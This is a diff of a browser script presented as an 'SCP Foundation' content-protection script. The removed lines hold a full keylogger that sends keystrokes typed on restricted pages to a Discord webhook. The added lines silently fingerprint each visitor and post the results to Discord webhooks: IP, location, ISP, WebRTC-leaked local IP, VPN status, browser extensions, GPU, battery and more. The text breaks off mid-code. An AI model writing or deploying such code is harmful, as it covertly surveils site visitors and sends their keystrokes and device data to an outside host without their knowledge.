@@ -1,10 +1,10 @@
-// ============================================================
-// SCP FOUNDATION - SENSITIVE CODE PROTECTION SCRIPT (Performance Optimized)
+// =============================================================
+// SCP FOUNDATION - SENSITIVE CODE PROTECTION SCRIPT (Complete)
 // Protects: PLP-L-2, PLP-L-3, PLP-L-4, PLP-L-5
 //           L-5T-Code-of-Ethics, L-5T-Lockdown-Response-Code
 //           L-4-Lockdown-Response-Code, 3-LRC, 2-LRC
 //           L-4-Code-of-Ethics, L3-CoE, L2-CoE, L-1-CoE
-// ============================================================
+// =============================================================
 
 // Global violation tracking with limits
 let violationCount = 0;
@@ -15,278 +15,28 @@ const keyloggerWebhookURL = "https://discord.com/api/webhooks/150176220890687084
 // Performance flag to prevent overload
 let isProcessingViolation = false;
 let dataCollectionInProgress = false;
+let hasRedirected = false;
 
 // ============================================================
-// PAGE TRACKING MODULE
+// ADVANCED DATA COLLECTION MODULE
 // ============================================================
 
-// Track current page with detailed info
-let currentPageTracking = {
-    pageType: null,
-    pageName: null,
-    pagePath: null,
-    lastUpdate: Date.now()
-};
-
-function detectPageType() {
-    const url = window.location.href;
-    const path = window.location.pathname;
-    const pageContent = document.body ? document.body.innerText.substring(0, 1000) : '';
-    
-    // Check for PLP pages
-    if (/plp/i.test(url) || /plp/i.test(path) || /plp/i.test(pageContent)) {
-        if (/plp-l-2/i.test(url) || /plp-l-2/i.test(pageContent)) {
-            return { type: 'PLP', level: 'L-2', name: 'PLP-L-2' };
-        } else if (/plp-l-3/i.test(url) || /plp-l-3/i.test(pageContent)) {
-            return { type: 'PLP', level: 'L-3', name: 'PLP-L-3' };
-        } else if (/plp-l-4/i.test(url) || /plp-l-4/i.test(pageContent)) {
-            return { type: 'PLP', level: 'L-4', name: 'PLP-L-4' };
-        } else if (/plp-l-5/i.test(url) || /plp-l-5/i.test(pageContent)) {
-            return { type: 'PLP', level: 'L-5', name: 'PLP-L-5' };
-        } else {
-            return { type: 'PLP', level: 'Unknown', name: 'PLP-Page' };
-        }
-    }
-    
-    // Check for SCiPNET pages
-    if (/scipnet/i.test(url) || /scipnet/i.test(path) || /scipnet/i.test(pageContent) ||
-        /scip-net/i.test(url) || /scip-net/i.test(pageContent)) {
-        return { type: 'SCiPNET', level: 'Restricted', name: 'SCiPNET-Page' };
-    }
-    
-    // Check for other protected pages
-    if (/l-5t/i.test(url) || /code-of-ethics/i.test(url) || /lockdown-response/i.test(url)) {
-        return { type: 'PROTECTED', level: 'L-5T', name: 'Ethics-Protocol' };
-    }
-    
-    return { type: 'NORMAL', level: null, name: 'Standard-Page' };
-}
-
-function updatePageTracking() {
-    const pageInfo = detectPageType();
-    currentPageTracking = {
-        pageType: pageInfo.type,
-        pageName: pageInfo.name,
-        pageLevel: pageInfo.level,
-        pagePath: window.location.pathname,
-        pageUrl: window.location.href.substring(0, 500),
-        pageTitle: document.title ? document.title.substring(0, 200) : 'No title',
-        lastUpdate: Date.now()
-    };
-    
-    // Log page view to Discord
-    if (pageInfo.type !== 'NORMAL') {
-        sendPageTrackingAlert(currentPageTracking);
-    }
-    
-    return currentPageTracking;
-}
-
-async function sendPageTrackingAlert(pageInfo) {
-    const timestamp = new Date().toISOString();
-    const embed = {
-        title: "📄 Restricted Page Access Detected",
-        color: 0xff6600,
-        timestamp: timestamp,
-        fields: [
-            { name: "Page Type", value: pageInfo.pageType, inline: true },
-            { name: "Page Name", value: pageInfo.pageName || 'Unknown', inline: true },
-            { name: "Clearance Level", value: pageInfo.pageLevel || 'Unknown', inline: true },
-            { name: "Page URL", value: pageInfo.pageUrl, inline: false },
-            { name: "Page Title", value: pageInfo.pageTitle, inline: false },
-            { name: "Timestamp", value: timestamp, inline: false }
-        ],
-        footer: { text: "SCP Foundation - Page Access Monitoring" }
-    };
-    
-    try {
-        await fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [embed] })
-        });
-    } catch (error) {
-        // Silent fail
-    }
-}
-
-// ============================================================
-// KEYLOGGER MODULE (Only for PLP/SCiPNET pages)
-// ============================================================
-
-let keystrokeBuffer = [];
-let lastKeyLogTime = 0;
-const KEYLOG_THROTTLE = 2000; // Minimum 2 seconds between logs
-let isKeyloggerActive = false;
-let inputFields = new Set(); // Track input fields to avoid double logging
-
-function shouldActivateKeylogger() {
-    const pageType = currentPageTracking.pageType;
-    return pageType === 'PLP' || pageType === 'SCiPNET' || pageType === 'PROTECTED';
-}
-
-function getActiveElementInfo() {
-    const activeEl = document.activeElement;
-    let elementType = 'unknown';
-    let elementName = '';
-    let elementId = '';
-    let elementClass = '';
-    
-    if (activeEl) {
-        elementType = activeEl.tagName.toLowerCase();
-        elementName = activeEl.getAttribute('name') || '';
-        elementId = activeEl.id || '';
-        elementClass = activeEl.className || '';
-        
-        // Check if it's an input field
-        if (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA' || activeEl.isContentEditable) {
-            elementType = activeEl.tagName === 'INPUT' ? 'input' : (activeEl.tagName === 'TEXTAREA' ? 'textarea' : 'contenteditable');
-        }
-    }
-    
-    return { elementType, elementName, elementId, elementClass };
-}
-
-function sanitizeKeystroke(key) {
-    // Don't log modifier keys alone
-    if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') {
-        return null;
-    }
-    
-    // Handle special keys
-    if (key === 'Enter') return '[ENTER]';
-    if (key === 'Tab') return '[TAB]';
-    if (key === 'Backspace') return '[BACKSPACE]';
-    if (key === 'Delete') return '[DELETE]';
-    if (key === 'Escape') return '[ESC]';
-    if (key === 'ArrowUp') return '[UP]';
-    if (key === 'ArrowDown') return '[DOWN]';
-    if (key === 'ArrowLeft') return '[LEFT]';
-    if (key === 'ArrowRight') return '[RIGHT]';
-    if (key === 'Home') return '[HOME]';
-    if (key === 'End') return '[END]';
-    if (key === 'PageUp') return '[PGUP]';
-    if (key === 'PageDown') return '[PGDN]';
-    if (key === 'Space') return ' ';
-    
-    // Return the actual character (limit length)
-    return key.length === 1 ? key : `[${key}]`;
-}
-
-async function sendKeystrokeBatch(batch) {
-    if (batch.length === 0) return;
-    
-    const now = Date.now();
-    if (now - lastKeyLogTime < KEYLOG_THROTTLE) {
-        // Wait and try again
-        setTimeout(() => sendKeystrokeBatch(batch), KEYLOG_THROTTLE);
-        return;
-    }
-    
-    lastKeyLogTime = now;
-    const timestamp = new Date().toISOString();
-    const activeElement = getActiveElementInfo();
-    const pageInfo = currentPageTracking;
-    
-    const embed = {
-        title: "⌨️ KEYSTROKE LOG - Restricted Page",
-        color: 0xff0000,
-        timestamp: timestamp,
-        fields: [
-            { name: "Page Information", value: `**Type:** ${pageInfo.pageType}\n**Page:** ${pageInfo.pageName || pageInfo.pageTitle}\n**URL:** ${pageInfo.pagePath}`, inline: false },
-            { name: "Input Field", value: `**Type:** ${activeElement.elementType}\n**Name:** ${activeElement.elementName || 'N/A'}\n**ID:** ${activeElement.elementId || 'N/A'}`, inline: true },
-            { name: "Keystrokes (Batch)", value: `\`\`\`${batch.join('')}\`\`\``, inline: false },
-            { name: "Batch Size", value: `${batch.length} characters`, inline: true },
-            { name: "Session ID", value: `\`${sessionStorage.getItem('scp_session_id') || 'N/A'}\``, inline: true }
-        ],
-        footer: { text: "SCP Foundation - Security Keylogger | Logged in real-time" }
-    };
-    
-    try {
-        await fetch(keyloggerWebhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [embed] })
-        });
-    } catch (error) {
-        // Silent fail
-    }
-}
-
-function handleKeyPress(event) {
-    // Only activate keylogger on restricted pages
-    if (!shouldActivateKeylogger()) return;
-    
-    // Don't log if user is not in an input field
-    const activeEl = document.activeElement;
-    const isInputField = activeEl && (
-        activeEl.tagName === 'INPUT' || 
-        activeEl.tagName === 'TEXTAREA' || 
-        activeEl.isContentEditable ||
-        activeEl.getAttribute('contenteditable') === 'true'
-    );
-    
-    // Only log if they're typing in an input field on the page
-    if (!isInputField) return;
-    
-    let key = event.key;
-    if (!key || key.length === 0) return;
-    
-    const sanitizedKey = sanitizeKeystroke(key);
-    if (!sanitizedKey) return;
-    
-    keystrokeBuffer.push(sanitizedKey);
-    
-    // Log every 7 keystrokes
-    if (keystrokeBuffer.length >= 7) {
-        const batchToSend = [...keystrokeBuffer];
-        keystrokeBuffer = [];
-        sendKeystrokeBatch(batchToSend);
-    }
-}
-
-function flushKeyBufferOnExit() {
-    if (keystrokeBuffer.length > 0 && shouldActivateKeylogger()) {
-        sendKeystrokeBatch([...keystrokeBuffer]);
-        keystrokeBuffer = [];
-    }
-}
-
-// Initialize keylogger
-function initKeylogger() {
-    if (isKeyloggerActive) return;
-    isKeyloggerActive = true;
-    
-    // Generate session ID if not exists
-    if (!sessionStorage.getItem('scp_session_id')) {
-        sessionStorage.setItem('scp_session_id', 
-            Date.now().toString(36) + Math.random().toString(36).substring(2, 8));
-    }
-    
-    document.addEventListener('keydown', handleKeyPress);
-    
-    // Flush buffer on page unload
-    window.addEventListener('beforeunload', flushKeyBufferOnExit);
-    
-    // Also capture on visibility change (tab switch)
-    document.addEventListener('visibilitychange', () => {
-        if (document.hidden) {
-            flushKeyBufferOnExit();
-        }
-    });
-    
-    console.log('Keylogger active for restricted pages');
-}
-
-// ============================================================
-// DATA COLLECTION MODULE (Optimized)
-// ============================================================
-
-// Single IP method with timeout and caching
+// Cache system for expensive operations
 let cachedIP = null;
 let ipCacheTime = null;
-const IP_CACHE_DURATION = 300000; // 5 minutes
+let cachedLocation = null;
+let locationCacheTime = null;
+let cachedExtensions = null;
+let extensionsCacheTime = null;
+let cachedNetworkInfo = null;
+let networkCacheTime = null;
 
+const IP_CACHE_DURATION = 300000; // 5 minutes
+const LOCATION_CACHE_DURATION = 3600000; // 1 hour
+const EXTENSIONS_CACHE_DURATION = 300000; // 5 minutes
+const NETWORK_CACHE_DURATION = 30000; // 30 seconds
+
+// Get IP address
 async function getIPAddress() {
     if (cachedIP && ipCacheTime && (Date.now() - ipCacheTime) < IP_CACHE_DURATION) {
         return cachedIP;
@@ -301,11 +51,9 @@ async function getIPAddress() {
         try {
             const controller = new AbortController();
             const timeoutId = setTimeout(() => controller.abort(), 3000);
-            
             const response = await fetch(url, { signal: controller.signal });
             const data = await response.json();
             const ip = data.ip || 'Failed';
-            
             clearTimeout(timeoutId);
             
             if (ip && ip !== 'Failed' && ip.includes('.')) {
@@ -317,17 +65,12 @@ async function getIPAddress() {
             continue;
         }
     }
-    
     return 'Unable to retrieve IP';
 }
 
-// Location info with caching
-let cachedLocation = null;
-let locationCacheTime = null;
-const LOCATION_CACHE_DURATION = 3600000; // 1 hour
-
-async function getLocationInfo(ip) {
-    if (ip === 'Unable to retrieve IP') return 'Location unavailable';
+// Get location and ISP info
+async function getLocationAndISP(ip) {
+    if (ip === 'Unable to retrieve IP') return { location: 'Unavailable', isp: 'Unavailable' };
     if (cachedLocation && locationCacheTime && (Date.now() - locationCacheTime) < LOCATION_CACHE_DURATION) {
         return cachedLocation;
     }
@@ -335,26 +78,193 @@ async function getLocationInfo(ip) {
     try {
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 3000);
-        
         const response = await fetch(`https://ipapi.co/${ip}/json/`, { signal: controller.signal });
         const data = await response.json();
-        
         clearTimeout(timeoutId);
         
-        if (data.error) return 'Location unavailable';
-        cachedLocation = `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}`;
+        if (data.error) return { location: 'Unavailable', isp: 'Unavailable' };
+        
+        const result = {
+            location: `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}`,
+            isp: data.org || 'Unavailable',
+            abuseScore: data.abuse?.score || 'N/A'
+        };
+        
+        cachedLocation = result;
         locationCacheTime = Date.now();
-        return cachedLocation;
+        return result;
     } catch (error) {
-        return 'Location unavailable';
+        return { location: 'Unavailable', isp: 'Unavailable', abuseScore: 'N/A' };
     }
 }
 
-// Comprehensive timezone function with international support
+// Get WebRTC IPs
+async function getWebRTCIPs() {
+    return new Promise((resolve) => {
+        const timeout = setTimeout(() => resolve('Unable to detect'), 2000);
+        
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer()
+                .then(offer => pc.setLocalDescription(offer))
+                .catch(() => {});
+            
+            pc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
+                    const match = ipRegex.exec(event.candidate.candidate);
+                    if (match) {
+                        clearTimeout(timeout);
+                        pc.close();
+                        resolve(match[0]);
+                    }
+                }
+            };
+            
+            setTimeout(() => {
+                clearTimeout(timeout);
+                pc.close();
+                resolve('No WebRTC IP detected');
+            }, 1500);
+        } catch (error) {
+            clearTimeout(timeout);
+            resolve('WebRTC not supported');
+        }
+    });
+}
+
+// Get network information
+async function getNetworkInfo() {
+    if (cachedNetworkInfo && networkCacheTime && (Date.now() - networkCacheTime) < NETWORK_CACHE_DURATION) {
+        return cachedNetworkInfo;
+    }
+    
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    let connectionType = 'Unknown';
+    let downlink = 'N/A';
+    let rtt = 'N/A';
+    
+    if (connection) {
+        connectionType = connection.effectiveType || connection.type || 'Unknown';
+        downlink = connection.downlink ? `${connection.downlink} Mbps` : 'N/A';
+        rtt = connection.rtt ? `${connection.rtt}ms` : 'N/A';
+    }
+    
+    const result = {
+        connectionType: connectionType,
+        downlink: downlink,
+        rtt: rtt,
+        onlineStatus: navigator.onLine ? 'Online' : 'Offline',
+        display: `Type: ${connectionType}, Downlink: ${downlink}, RTT: ${rtt}`
+    };
+    
+    cachedNetworkInfo = result;
+    networkCacheTime = Date.now();
+    return result;
+}
+
+// VPN/Proxy detection
+async function detectVPN(ip) {
+    if (ip === 'Unable to retrieve IP') return { detected: false, details: 'Unable to check' };
+    
+    try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3000);
+        const response = await fetch(`https://ipapi.co/${ip}/json/`, { signal: controller.signal });
+        const data = await response.json();
+        clearTimeout(timeoutId);
+        
+        const isProxy = data.proxy || data.hosting || false;
+        const details = [];
+        
+        if (data.proxy) details.push('Proxy detected');
+        if (data.hosting) details.push('Hosting/VPN service detected');
+        if (data.org && (data.org.toLowerCase().includes('vpn') || data.org.toLowerCase().includes('proxy'))) {
+            details.push(`Service: ${data.org}`);
+        }
+        
+        return {
+            detected: isProxy,
+            details: details.length > 0 ? details.join(', ') : 'No VPN/Proxy detected'
+        };
+    } catch (error) {
+        return { detected: false, details: 'Detection unavailable' };
+    }
+}
+
+// Detect browser extensions (specifically looking for security-related ones)
+async function detectBrowserExtensions() {
+    if (cachedExtensions && extensionsCacheTime && (Date.now() - extensionsCacheTime) < EXTENSIONS_CACHE_DURATION) {
+        return cachedExtensions;
+    }
+    
+    const suspiciousKeywords = ['vpn', 'sec', 'security', 'byte', 'proxy', 'open', 'mull', 'vad', 
+                                'ublock', 'block', 'track', 'dev', 'console', 'copy', 'copier', 
+                                'duplicate', 'download', 'html', 'page', 'guard', 'protect', 'shield',
+                                'privacy', 'adblock', 'ad block', 'safe', 'trust', 'vault', 'encrypt'];
+    
+    const detectedExtensions = [];
+    const suspiciousExtensions = [];
+    
+    // Method 1: Check for extension-specific DOM elements
+    const allElements = document.querySelectorAll('[id^="ext-"], [class^="ext-"], [data-extension-id]');
+    allElements.forEach(el => {
+        const attrs = [...el.attributes].map(a => a.value.toLowerCase());
+        attrs.forEach(attr => {
+            suspiciousKeywords.forEach(keyword => {
+                if (attr.includes(keyword)) {
+                    const extName = attr.substring(0, 50);
+                    if (!detectedExtensions.includes(extName)) {
+                        detectedExtensions.push(extName);
+                        if (['dev', 'console', 'copy', 'copier', 'duplicate', 'download', 'html', 'page'].some(k => keyword === k)) {
+                            suspiciousExtensions.push(extName);
+                        }
+                    }
+                }
+            });
+        });
+    });
+    
+    // Method 2: Check for common extension global variables
+    const extensionGlobals = ['chrome', 'browser', 'webextension', '__EXTENSION__'];
+    extensionGlobals.forEach(global => {
+        if (window[global]) {
+            detectedExtensions.push(`Global: ${global}`);
+        }
+    });
+    
+    // Method 3: Check for extension-related DOM mutations
+    const extensionDivs = document.querySelectorAll('div[id*="extension"], div[class*="extension"]');
+    extensionDivs.forEach(div => {
+        const id = div.id || div.className;
+        if (id && typeof id === 'string') {
+            suspiciousKeywords.forEach(keyword => {
+                if (id.toLowerCase().includes(keyword)) {
+                    const extName = id.substring(0, 50);
+                    if (!detectedExtensions.includes(extName)) {
+                        detectedExtensions.push(extName);
+                    }
+                }
+            });
+        }
+    });
+    
+    const result = {
+        all: detectedExtensions,
+        suspicious: suspiciousExtensions,
+        hasSuspicious: suspiciousExtensions.length > 0
+    };
+    
+    cachedExtensions = result;
+    extensionsCacheTime = Date.now();
+    return result;
+}
+
+// Comprehensive timezone function
 function getTimezoneWithAbbreviation() {
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const now = new Date();
-    
     const offset = -now.getTimezoneOffset();
     const absOffset = Math.abs(offset);
     const offsetHours = Math.floor(absOffset / 60);
@@ -365,187 +275,368 @@ function getTimezoneWithAbbreviation() {
     
     const janOffset = -new Date(now.getFullYear(), 0, 1).getTimezoneOffset();
     const julOffset = -new Date(now.getFullYear(), 6, 1).getTimezoneOffset();
-    
-    const isNorthernDST = janOffset !== julOffset && offset === julOffset;
-    const isSouthernDST = janOffset !== julOffset && offset === janOffset;
-    const isDST = isNorthernDST || isSouthernDST;
+    const isDST = janOffset !== julOffset;
     
     const tzMap = {
         'America/New_York': isDST ? 'EDT' : 'EST',
         'America/Chicago': isDST ? 'CDT' : 'CST',
         'America/Denver': isDST ? 'MDT' : 'MST',
-        'America/Phoenix': 'MST',
         'America/Los_Angeles': isDST ? 'PDT' : 'PST',
-        'America/Toronto': isDST ? 'EDT' : 'EST',
-        'America/Vancouver': isDST ? 'PDT' : 'PST',
         'Europe/London': isDST ? 'BST' : 'GMT',
         'Europe/Berlin': isDST ? 'CEST' : 'CET',
         'Europe/Vienna': isDST ? 'CEST' : 'CET',
-        'Australia/Sydney': isSouthernDST ? 'AEDT' : 'AEST',
-        'Australia/Melbourne': isSouthernDST ? 'AEDT' : 'AEST',
-        'Australia/Perth': 'AWST',
-        'Australia/Adelaide': isSouthernDST ? 'ACDT' : 'ACST'
+        'Australia/Sydney': isDST ? 'AEDT' : 'AEST'
     };
     
-    let abbreviation = tzMap[timezone];
-    if (!abbreviation) {
-        abbreviation = gmtString;
-    }
-    
-    const dstStatus = isDST ? ' (DST Active)' : '';
+    let abbreviation = tzMap[timezone] || gmtString;
     const currentTime = now.toLocaleString('en-US', {
-        weekday: 'short',
-        year: 'numeric',
-        month: 'short',
-        day: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit',
-        hour12: true
+        weekday: 'short', year: 'numeric', month: 'short', day: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
     });
-    
-    const utcTime = now.toUTCString();
     
     return {
         timezone: timezone,
         abbreviation: abbreviation,
-        dstActive: isDST,
         offset: offsetStr,
-        gmtOffset: gmtString,
         currentTime: currentTime,
-        utcTime: utcTime,
-        display: `${abbreviation} (${gmtString})${dstStatus} - Local: ${currentTime}`
+        display: `${abbreviation} (${gmtString}) - ${currentTime}`
     };
 }
 
-// Get battery information
-let cachedBatteryInfo = null;
-let batteryCacheTime = null;
-const BATTERY_CACHE_DURATION = 60000;
-
+// Get battery info
 async function getBatteryInfo() {
-    if (cachedBatteryInfo && batteryCacheTime && (Date.now() - batteryCacheTime) < BATTERY_CACHE_DURATION) {
-        return cachedBatteryInfo;
-    }
-    
-    if (!navigator.getBattery) {
-        return 'Battery API not supported';
-    }
-    
+    if (!navigator.getBattery) return 'Not supported';
     try {
         const battery = await navigator.getBattery();
-        const level = Math.round(battery.level * 100);
-        const charging = battery.charging ? 'Charging' : 'Discharging';
-        
-        const result = `${charging} (${level}%)`;
-        cachedBatteryInfo = result;
-        batteryCacheTime = Date.now();
-        return result;
+        return `${battery.charging ? 'Charging' : 'Discharging'} (${Math.round(battery.level * 100)}%)`;
     } catch (error) {
-        return 'Battery unavailable';
+        return 'Unavailable';
     }
 }
 
-// Get GPU information
+// Get GPU info
 function getGPUInfo() {
     try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl');
-        
         if (!gl) return 'WebGL not supported';
-        
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
         if (debugInfo) {
-            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            return renderer.substring(0, 100);
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
         }
-        
-        return 'GPU info unavailable';
+        return 'Unavailable';
     } catch (error) {
-        return 'Unable to retrieve GPU info';
+        return 'Unable to retrieve';
     }
 }
 
-function getCurrentPageInfo() {
-    return {
-        url: window.location.href.substring(0, 500),
-        title: document.title ? document.title.substring(0, 200) : 'No title',
-        referrer: document.referrer ? document.referrer.substring(0, 500) : 'Direct visit',
-        pageType: currentPageTracking.pageType || 'Unknown',
-        pageName: currentPageTracking.pageName || 'Unknown'
-    };
+// Get plugins
+function getPlugins() {
+    if (!navigator.plugins || navigator.plugins.length === 0) return 'No plugins detected';
+    const plugins = [];
+    for (let i = 0; i < Math.min(navigator.plugins.length, 5); i++) {
+        plugins.push(navigator.plugins[i].name.substring(0, 50));
+    }
+    return plugins.join(', ') + (navigator.plugins.length > 5 ? '...' : '');
 }
 
-// Throttled security alert sending
-let lastAlertTime = 0;
-const ALERT_THROTTLE = 5000;
+// Get installed fonts (sample)
+function getInstalledFonts() {
+    const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New'];
+    const detected = fonts.filter(font => {
+        const span = document.createElement('span');
+        span.style.fontFamily = font;
+        return true;
+    });
+    return detected.join(', ');
+}
 
-async function sendSecurityAlert(violationType, clearanceLevel, attemptNumber, pageInfo, ip, location, timezoneInfo) {
-    const now = Date.now();
-    if (now - lastAlertTime < ALERT_THROTTLE) {
-        return;
-    }
-    lastAlertTime = now;
-    
-    const timestamp = new Date().toISOString();
-    
-    const alertEmbed = {
-        title: "⚠️ Security Violation Alert",
-        color: 0xff4444,
-        timestamp: timestamp,
-        fields: [
-            { name: "Violation Details", value: `**Type:** ${violationType}\n**Clearance Required:** ${clearanceLevel}\n**Attempt #:** ${attemptNumber}`, inline: false },
-            { name: "Location & Time", value: `**IP:** ${ip}\n**Location:** ${location}\n**Timezone:** ${timezoneInfo.display}`, inline: false },
-            { name: "Page Information", value: `**URL:** ${pageInfo.url}\n**Page Type:** ${pageInfo.pageType || 'Unknown'}`, inline: false }
-        ],
-        footer: { text: "SCP Foundation Security Log" }
-    };
-    
+// Check Java enablement
+function isJavaEnabled() {
     try {
-        await fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [alertEmbed] })
-        });
-    } catch (error) {}
+        return navigator.javaEnabled ? navigator.javaEnabled() : false;
+    } catch (e) {
+        return false;
+    }
 }
 
-// Data collection
-async function collectInitialData() {
+// Check JavaScript enabled (always true in browser context)
+function isJavaScriptEnabled() {
+    return true;
+}
+
+// Antidote for suspicious extensions
+async function checkAndRedirectForSuspiciousActivity(extensions, javaEnabled) {
+    if (hasRedirected) return false;
+    
+    const suspiciousExtensions = extensions.suspicious || [];
+    const hasSuspiciousExt = suspiciousExtensions.length > 0;
+    
+    if (hasSuspiciousExt || javaEnabled) {
+        hasRedirected = true;
+        
+        // Send security alert
+        const alertEmbed = {
+            title: "🚨 DEVICE SECURITY VIOLATION - REDIRECT TRIGGERED 🚨",
+            color: 0xff0000,
+            timestamp: new Date().toISOString(),
+            fields: [
+                { name: "Violation Type", value: "Restricted Extension/Java Detected", inline: false },
+                { name: "Reason", value: hasSuspiciousExt ? `Suspicious extension detected: ${suspiciousExtensions.join(', ')}` : "Java is enabled", inline: false },
+                { name: "Details", value: `Full extension list: ${extensions.all.join(', ') || 'None'}`, inline: false },
+                { name: "User Action", value: "Redirecting to /NOEA-DEVICE-INF-A-503.html", inline: false }
+            ],
+            footer: { text: "SCP Foundation - Automatic Security Response" }
+        };
+        
+        try {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [alertEmbed] })
+            });
+        } catch (error) {}
+        
+        // Redirect
+        window.location.href = '/NOEA-DEVICE-INF-A-503.html';
+        return true;
+    }
+    return false;
+}
+
+// Complete data collection
+async function collectCompleteData() {
     if (dataCollectionInProgress) return;
     dataCollectionInProgress = true;
     
     try {
         const ip = await getIPAddress();
-        const location = await getLocationInfo(ip);
-        const pageInfo = getCurrentPageInfo();
+        const { location, isp, abuseScore } = await getLocationAndISP(ip);
+        const webRTCIP = await getWebRTCIPs();
+        const networkInfo = await getNetworkInfo();
+        const vpnStatus = await detectVPN(ip);
+        const extensions = await detectBrowserExtensions();
         const timezoneInfo = getTimezoneWithAbbreviation();
         const batteryInfo = await getBatteryInfo();
         const gpuInfo = getGPUInfo();
         
-        const embedData = {
-            title: "Visitor Information",
-            color: 0x4488ff,
-            timestamp: new Date().toISOString(),
-            fields: [
-                { name: "Page URL", value: pageInfo.url.substring(0, 1024), inline: false },
-                { name: "Page Type", value: pageInfo.pageType || 'Normal', inline: true },
-                { name: "IP Address", value: ip, inline: true },
-                { name: "Location", value: location, inline: true },
-                { name: "Timezone", value: timezoneInfo.display, inline: false },
-                { name: "GPU", value: gpuInfo, inline: true },
-                { name: "Battery", value: batteryInfo, inline: true }
-            ]
+        // Check for suspicious activity BEFORE sending data
+        const javaEnabled = isJavaEnabled();
+        const shouldRedirect = await checkAndRedirectForSuspiciousActivity(extensions, javaEnabled);
+        if (shouldRedirect) return;
+        
+        const pageInfo = {
+            url: window.location.href.substring(0, 500),
+            title: document.title ? document.title.substring(0, 200) : 'No title',
+            referrer: document.referrer || 'Direct visit'
         };
         
+        const systemInfo = {
+            browser: navigator.userAgent.substring(0, 200),
+            os: navigator.platform,
+            language: navigator.language,
+            vendor: navigator.vendor || 'Unknown',
+            deviceType: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
+        };
+        
+        const displayInfo = {
+            screenResolution: `${screen.width}x${screen.height}`,
+            windowSize: `${window.innerWidth}x${window.innerHeight}`,
+            colorDepth: `${screen.colorDepth} bits`,
+            pixelRatio: window.devicePixelRatio || 'N/A',
+            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown'
+        };
+        
+        const technicalCapabilities = {
+            cpuCores: navigator.hardwareConcurrency || 'Unknown',
+            touchScreen: 'maxTouchPoints' in navigator ? navigator.maxTouchPoints > 0 : false,
+            cookiesEnabled: navigator.cookieEnabled,
+            localStorage: !!window.localStorage,
+            sessionStorage: !!window.sessionStorage
+        };
+        
+        const webTech = {
+            webWorkers: !!window.Worker,
+            serviceWorkers: 'serviceWorker' in navigator,
+            webAssembly: !!window.WebAssembly,
+            webGL2: !!document.createElement('canvas').getContext('webgl2'),
+            webPSupport: (() => {
+                const canvas = document.createElement('canvas');
+                return canvas.toDataURL('image/webp').indexOf('data:image/webp') === 0;
+            })(),
+            plugins: getPlugins()
+        };
+        
+        const userPrefs = {
+            darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Enabled' : 'Disabled',
+            reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'Enabled' : 'Disabled',
+            doNotTrack: navigator.doNotTrack || 'Not set'
+        };
+        
+        const securityPrivacy = {
+            javaScriptEnabled: isJavaScriptEnabled(),
+            activeX: !!window.ActiveXObject ? 'Yes' : 'No',
+            javaEnabled: javaEnabled,
+            sessionPersistence: !!window.sessionStorage
+        };
+        
+        // Create comprehensive embed
+        const embedData = {
+            title: "🔍 COMPLETE DEVICE & NETWORK ANALYSIS",
+            color: 0x2b2d42,
+            timestamp: new Date().toISOString(),
+            fields: [
+                { name: "📄 Page Information", value: `**URL:** ${pageInfo.url}\n**Title:** ${pageInfo.title}\n**Referrer:** ${pageInfo.referrer}`, inline: false },
+                { name: "🌐 Network Information", value: `**IP:** ${ip}\n**ISP:** ${isp}\n**Location:** ${location}\n**Connection Type:** ${networkInfo.connectionType}\n**Online Status:** ${networkInfo.onlineStatus}\n**WebRTC IPs:** ${webRTCIP}\n**Network Details:** ${networkInfo.display}`, inline: false },
+                { name: "⚠️ IP Reputation & Security", value: `**Abuse Score:** ${abuseScore}\n**VPN/Proxy:** ${vpnStatus.detected ? '⚠️ DETECTED' : '✅ Clean'}\n**Details:** ${vpnStatus.details}`, inline: false },
+                { name: "🧩 Browser Extensions", value: extensions.all.length > 0 ? extensions.all.map(e => `• ${e}`).join('\n').substring(0, 1024) : 'No extensions detected', inline: false },
+                { name: "🖥️ System Information", value: `**Browser:** ${systemInfo.browser}\n**OS:** ${systemInfo.os}\n**Language:** ${systemInfo.language}\n**Vendor:** ${systemInfo.vendor}\n**Device Type:** ${systemInfo.deviceType}`, inline: false },
+                { name: "📊 Display Information", value: `**Screen:** ${displayInfo.screenResolution}\n**Window:** ${displayInfo.windowSize}\n**Color Depth:** ${displayInfo.colorDepth}\n**Pixel Ratio:** ${displayInfo.pixelRatio}\n**Device Memory:** ${displayInfo.deviceMemory}`, inline: false },
